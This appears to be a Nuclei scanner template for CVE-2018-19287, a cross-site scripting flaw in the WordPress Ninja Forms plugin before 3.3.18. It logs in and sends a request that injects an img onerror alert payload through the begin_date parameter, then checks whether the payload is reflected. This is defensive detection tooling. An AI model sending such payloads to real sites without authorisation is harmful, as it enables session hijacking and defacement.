http:
- matchers:
  - part: body_2
    type: word
    words:
    - Begin Date" value="\"><img src=x onerror=alert(document.domain);//">
  - part: header_2
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date="><img+src%3Dx+onerror%3Dalert%28document.domain%29%3B%2F%2F&end_date&filter_action=Filter&paged=1&action2=-1
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2018-19287
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:ninjaforma:ninja_forms:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2018-19287
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.96825
    epss-score: 0.37007
  description: 'WordPress Ninja Forms plugin before 3.3.18 contains a cross-site scripting
    vulnerability. An attacker can inject arbitrary script in includes/Admin/Menus/Submissions.php
    via the begin_date, end_date, or form_id parameters. This can allow an attacker
    to steal cookie-based authentication credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: ninja_forms
    vendor: ninjaforma
    verified: true
  name: WordPress Ninja Forms <3.3.18 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/fb036dc2-0ee8-4a3e-afac-f52050b3f8c7
  - https://wordpress.org/plugins/ninja-forms/
  - https://www.exploit-db.com/exploits/45880
  - https://nvd.nist.gov/vuln/detail/CVE-2018-19287
  - https://plugins.trac.wordpress.org/changeset/1974335/ninja-forms/trunk/includes/Admin/Menus/Submissions.php
  remediation: 'Upgrade to the latest version of the Ninja Forms plugin (3.3.18 or
    higher) to mitigate this vulnerability.

    '
  severity: medium
  tags: wp-plugin,wp,xss,authenticated,wpscan,edb,cve,cve2018,ninja-forms,wordpress,ninjaforma
